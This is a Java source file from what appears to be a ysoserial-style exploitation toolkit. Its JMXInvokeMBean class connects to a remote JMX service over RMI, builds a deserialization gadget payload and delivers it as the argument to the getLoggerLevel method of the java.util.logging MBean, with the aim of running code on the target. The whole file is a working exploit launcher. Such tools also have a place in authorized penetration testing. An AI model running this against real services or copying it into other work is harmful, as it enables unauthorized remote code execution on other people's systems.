package com.h2tg.ysogate.server;

import com.h2tg.ysogate.Main;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

/*
 * Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
 * Attempts to exploit the service by invoking a method on a exposed MBean, passing the payload as argument.
 *
 */
public class JMXInvokeMBean {

	public static void main(String[] args) throws Exception {

		if (args.length < 6) {
			System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <arg...>");
			System.exit(-1);
		}

		JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/jmxrmi");

		JMXConnector          jmxConnector          = JMXConnectorFactory.connect(url);
		MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

		// 去除前两个参数
		String[] newArray = new String[args.length - 2];
		System.arraycopy(args, 2, newArray, 0, newArray.length);

		Main.main(newArray);
		Object payloadObject = Main.PAYLOAD;

		ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

		mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

		//close the connection
		jmxConnector.close();
	}
}
